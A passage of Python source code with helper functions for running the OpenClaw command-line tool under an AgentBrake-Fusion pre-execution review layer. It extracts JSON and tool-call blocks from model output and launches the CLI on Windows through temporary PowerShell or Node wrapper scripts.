        return "\u5f53\u524d\u5bf9\u8bdd\u5df2\u901a\u8fc7\u672c\u5730 OpenClaw \u63a5\u5165 AgentBrake-Fusion\uff1b\u5177\u4f53\u5e95\u5c42\u6a21\u578b\u7531\u672c\u5730 OpenClaw \u914d\u7f6e\u51b3\u5b9a\u3002\u540e\u7eed\u5982\u679c\u51fa\u73b0\u5de5\u5177\u8c03\u7528\uff0c\u4f1a\u5148\u8fdb\u5165\u6267\u884c\u524d\u5ba1\u67e5\u3002"
    return "OpenClaw \u5df2\u5b8c\u6210\u672c\u8f6e\u5904\u7406\uff0c\u4f46\u6ca1\u6709\u8fd4\u56de\u53ef\u89c1\u6587\u672c\u3002\u8bf7\u7ee7\u7eed\u8f93\u5165\u5177\u4f53\u4efb\u52a1\uff1b\u5982\u679c\u540e\u7eed\u4ea7\u751f\u5de5\u5177\u8c03\u7528\uff0cAgentBrake-Fusion \u4f1a\u5148\u8fdb\u884c\u6267\u884c\u524d\u5ba1\u67e5\u3002"


def _looks_like_identity_question(message: str) -> bool:
    compact = message.strip().lower()
    if not compact:
        return False
    stable_terms = ("\u4ec0\u4e48\u6a21\u578b", "\u54ea\u4e2a\u6a21\u578b", "\u6a21\u578b", "\u4f60\u662f\u8c01", "\u8eab\u4efd")
    if any(term in compact for term in stable_terms):
        return True
    return any(term in compact for term in ("who are you", "what model", "which model"))


def _studio_cli_message(message: str, user_task: str) -> str:
    task = user_task.strip()
    text = message.strip()
    if task and task != text:
        return f"{text}\n\n\u7528\u6237\u4efb\u52a1\uff1a{task}"
    return text


def _extract_json_like_blocks(text: str) -> list[str]:
    blocks: list[str] = []
    import re

    for pattern in (r"<tool_call>\s*(.*?)\s*</tool_call>", r"```json\s*(.*?)\s*```"):
        blocks.extend(match.group(1).strip() for match in re.finditer(pattern, text, flags=re.S | re.I))
    return blocks


def _extract_balanced_json_objects(text: str) -> list[str]:
    blocks: list[str] = []
    starts = [idx for idx, char in enumerate(text) if char == "{"]
    for start in starts[:10]:
        depth = 0
        for idx in range(start, min(len(text), start + 8000)):
            char = text[idx]
            if char == "{":
                depth += 1
            elif char == "}":
                depth -= 1
                if depth == 0:
                    blocks.append(text[start : idx + 1])
                    break
    return blocks


def _json_or_text(value: Any) -> Any:
    if isinstance(value, bytes):
        value = value.decode("utf-8", errors="replace")
    if not isinstance(value, str):
        return value
    try:
        return json.loads(value)
    except Exception:  # noqa: BLE001
        return value


def _env_escape(value: str) -> str:
    if any(ch in value for ch in ("\n", "\r")):
        return json.dumps(value)
    return value


def _has_non_ascii(value: str) -> bool:
    return any(ord(ch) > 127 for ch in value)


def _windows_node_openclaw_command(resolved: str) -> list[str]:
    path = Path(resolved)
    if os.name != "nt" or path.name.lower() not in {"openclaw.cmd", "openclaw"}:
        return [resolved]
    npm_dir = path.parent
    entry = npm_dir / "node_modules" / "openclaw" / "openclaw.mjs"
    if not entry.exists():
        return [resolved]
    node = npm_dir / "node.exe"
    node_cmd = str(node) if node.exists() else shutil.which("node")
    if not node_cmd:
        return [resolved]
    return [node_cmd, str(entry)]


def _ps_single_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _run_openclaw_cli(cmd: list[str], *, timeout: float, env: dict[str, str], force_powershell: bool = False) -> subprocess.CompletedProcess[str]:
    if os.name == "nt" and any(_has_non_ascii(part) for part in cmd):
        wrapped = _run_openclaw_cli_via_node_wrapper(cmd, timeout=timeout, env=env)
        if wrapped is not None:
            return wrapped
    if os.name == "nt" and force_powershell:
        script = "\n".join(
            [
                "$ErrorActionPreference = 'Stop'",
                "$OutputEncoding = [System.Text.UTF8Encoding]::new()",
                "[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new()",
                "& " + " ".join(_ps_single_quote(part) for part in cmd),
                "exit $LASTEXITCODE",
                "",
            ]
        )
        temp_path = ""
        try:
            with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False, encoding="utf-16") as fh:
                fh.write(script)
                temp_path = fh.name
            return subprocess.run(
                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", temp_path],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout,
                check=False,
                env=env,
            )
        finally:
            if temp_path:
                try:
                    Path(temp_path).unlink(missing_ok=True)
                except Exception:
                    pass
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=timeout,
        check=False,
        env=env,
    )


def _run_openclaw_cli_via_node_wrapper(
    cmd: list[str], *, timeout: float, env: dict[str, str]
) -> subprocess.CompletedProcess[str] | None:
    node = shutil.which("node")
    if not node:
        return None

    payload_path = ""
    wrapper_path = ""
    try:
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False, encoding="utf-8") as payload:
            json.dump({"cmd": cmd}, payload, ensure_ascii=False)
            payload_path = payload.name
        wrapper_source = r"""
const fs = require("fs");
const cp = require("child_process");
const payloadPath = process.argv[2];
const payload = JSON.parse(fs.readFileSync(payloadPath, "utf8"));
const cmd = payload.cmd;
const child = cp.spawn(cmd[0], cmd.slice(1), { shell: false, env: process.env });
child.stdout.on("data", (chunk) => process.stdout.write(chunk));
child.stderr.on("data", (chunk) => process.stderr.write(chunk));
child.on("error", (err) => {
  console.error(err && err.stack ? err.stack : String(err));
  process.exit(127);
});
child.on("close", (code) => process.exit(code || 0));
"""
        with tempfile.NamedTemporaryFile("w", suffix=".cjs", delete=False, encoding="utf-8") as wrapper:
            wrapper.write(wrapper_source)
            wrapper_path = wrapper.name
        return subprocess.run(
            [node, wrapper_path, payload_path],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout,
            check=False,
            env=env,
        )
    except Exception:
        return None
    finally:
        for temp in (payload_path, wrapper_path):
            if temp:
                try:
                    Path(temp).unlink(missing_ok=True)
                except Exception:
                    pass


def _elapsed_ms(started: float) -> float:
    return round((time.perf_counter() - started) * 1000.0, 3)


def _utc_now() -> str:
    from datetime import datetime, timezone

    return datetime.now(timezone.utc).isoformat()
